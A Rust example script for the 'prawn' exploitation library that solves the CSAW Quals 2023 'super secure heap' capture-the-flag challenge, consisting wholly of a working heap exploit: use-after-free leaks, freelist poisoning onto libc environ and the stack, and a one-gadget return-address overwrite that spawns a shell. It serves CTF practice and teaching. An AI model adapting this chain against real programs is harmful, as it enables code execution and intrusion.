/*
   prawn Example Script
   CSAW Quals 2023: "super secure heap"
*/

use prawn::tubes::process::*;
use prawn::tubes::Tube;
use prawn::util::*;

use std::error::Error;
use std::time::Duration;

type Result<T> = std::result::Result<T, Box<dyn Error>>;

async fn selkey(p: &mut Process, key: bool) -> Result<()> {
   if !key {
       p.sendlineafter(b">", b"2").await?;
   } else {
       p.sendlineafter(b">", b"1").await?;
   }
   Ok(())
}

async fn alloc(p: &mut Process, size: usize, key: bool) -> Result<()> {
    selkey(p, key).await?;
    p.sendline(b"1").await?;
    p.sendline(&format!("{}", size).into_bytes()).await?;
    Ok(())
}

async fn delete(p: &mut Process, idx: usize, key: bool) -> Result<()> {
    selkey(p, key).await?;
    p.sendline(b"2").await?;
    p.sendline(&format!("{}", idx).into_bytes()).await?;
    Ok(())
}

async fn modify(p: &mut Process, idx: usize, keyno: usize, size: usize, cont: Vec<u8>) -> Result<()> {
    selkey(p, false).await?;
    p.sendline(b"3").await?;
    p.sendline(&format!("{}", idx).into_bytes()).await?;
    p.sendline(&format!("{}", keyno).into_bytes()).await?;
    p.sendline(&format!("{}", size).into_bytes()).await?;
    p.send(&cont).await?;
    Ok(())
}

async fn kmodify(p: &mut Process, idx: usize, size: usize, cont: Vec<u8>) -> Result<()> {
    selkey(p, true).await?;
    p.sendline(b"3").await?;
    p.sendline(&format!("{}", idx).into_bytes()).await?;
    p.sendline(&format!("{}", size).into_bytes()).await?;
    p.sendline(&cont).await?;
    Ok(())
}

async fn show(p: &mut Process, idx: usize, key: bool) -> Result<()> {
    selkey(p, key).await?;
    p.sendline(b"4").await?;
    p.sendline(&format!("{}", idx).into_bytes()).await?;
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let cfg = ProcessConfig::default();
    let mut p = Process::new(["./bins/super_secure_heap"], &cfg).await?;

    // setup key
    let key = b"LOL";
    alloc(&mut p, key.len()+1, true).await?;
    kmodify(&mut p, 0, key.len(), key.to_vec()).await?;

    //// uaf to leak a freelist pointer
    let heap_leak = {
        alloc(&mut p, 20, false).await?;
        alloc(&mut p, 20, false).await?;
        delete(&mut p, 0, false).await?;
        delete(&mut p, 1, false).await?;

        show(&mut p, 1, false).await?;

        p.recvuntil(b"Here is your content:").await?;
        p.recvline().await?;

        let mut heap_leak = p.recv(6).await?;
        heap_leak.append(&mut vec![0u8, 0]);
        u64_chk(&heap_leak)?
    };
    println!("heap: {:#x}", &heap_leak);

    //// uaf to leak an arena pointer from unsorted bin consolidation
    let environ_off = 0x1ef600;
    let libc_leak = {
        alloc(&mut p, 0xec0, false).await?;
        alloc(&mut p, 0xec0, false).await?;
        delete(&mut p, 2, false).await?;
        delete(&mut p, 3, false).await?;

        show(&mut p, 2, false).await?;

        p.recvuntil(b"Here is your content:").await?;
        p.recvline().await?;

        let mut libc_leak = p.recv(6).await?;
        libc_leak.append(&mut vec![0u8, 0]);
        u64_chk(&libc_leak)? - 0x1ecbe0
    };
    println!("libc: {:#x}", &libc_leak);

    let environ = libc_leak+environ_off;
    println!("libc environ: {:#x}", &environ);

    // hijack freelist to get an allocation on libc environ to leak stack
    let stack_leak = {
        modify(&mut p, 1, 0, p64(environ).len(), p64(environ)).await?;

        alloc(&mut p, 20, false).await?;
        alloc(&mut p, 20, false).await?;

        show(&mut p, 5, false).await?;

        p.recvuntil(b"Here is your content:").await?;
        p.recvline().await?;

        let mut stack_leak = p.recv(6).await?;
        stack_leak.append(&mut vec![0u8, 0]);
        u64_chk(&stack_leak)?
    };
    println!("stack: {:#x}", &stack_leak);

    // get idx 7 on the freelist
    alloc(&mut p, 32, false).await?;
    alloc(&mut p, 32, false).await?;
    delete(&mut p, 6, false).await?;
    delete(&mut p, 7, false).await?;

    // reallocate 7 as a key (keys contents won't be encrypted)
    alloc(&mut p, 32, true).await?;

    // free idx 7 again to create a uaf on the previous key chunk
    delete(&mut p, 7, false).await?;

    // overwrite the freelist pointer to get an allocation on the stack
    let return_addr = stack_leak - 0x100;
    println!("ret leak: {:#x}", &return_addr);
    kmodify(&mut p, 1, 8, p64(return_addr)).await?;

    // moves hijacked chunk to top of freelist
    alloc(&mut p, 32, false).await?;

    // this chunk should be on top of the return addr
    alloc(&mut p, 32, true).await?;

    // overwrite return addr with one gadget
    let one_gadget = p64(libc_leak+0xe3b01);
    kmodify(&mut p, 2, 31, one_gadget).await?;

    // exit and get shell!
    p.sendline(b"3").await?;

    std::thread::sleep(Duration::from_millis(200));
    p.sendline(b"").await?;

    p.interactive().await?;
    Ok(())
}
